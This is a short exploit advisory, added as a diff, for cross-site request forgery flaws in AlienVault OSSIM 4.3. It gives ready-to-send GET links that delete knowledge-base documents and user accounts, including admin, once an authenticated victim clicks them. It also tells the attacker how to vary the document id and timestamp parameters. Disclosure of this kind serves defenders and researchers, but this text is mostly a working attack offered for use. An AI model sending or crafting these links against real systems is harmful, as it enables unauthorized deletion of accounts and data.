@@ -1,0 +1,46 @@
+# Exploit Title: [AlienVault - ossim CSRF]
+# Date: [10-5-2015]
+# Exploit Author: [MohamadReza Mohajerani]
+# Vendor Homepage: [www.alienvault.com]
+# Software Link: [https://www.alienvault.com/products/ossim]
+# Version: [Tested on 4.3]
+
+Vulnerability Details:
+
+=====================
+
+
+Multiple CSRF vectors exists within AlienVault ossim allowing the following
+attacks:
+
+1)Delete user accounts(ex.admin account)
+
+2)Delete knowledge DB items
+
+Exploit code(s):
+
+===============
+
+The only thing the attacker needs to do is sending the following link to
+the victim via GET request , if the victim authenticated on the ossim and
+click on the link the following attacks can be occurred :
+
+1)For deleting the
+knowledge DB items just send the link below:
+https://ossim-ip/ossim/repository/repository_delete.php?id_document=10232
+
+
+[id_document is the item number which you want to delete (it starts from 1)]
+
+2)For deleting the user accounts (ex.admin account) use the link below :
+https://ossim-ip/ossim/session/deleteuser.php?user=admin&_=1444042812845
+
+[the random number (1444042812845) is not important at all and you can
+change the number to whatever you want]
+
+
+
+Severity Level:
+
+================
+High
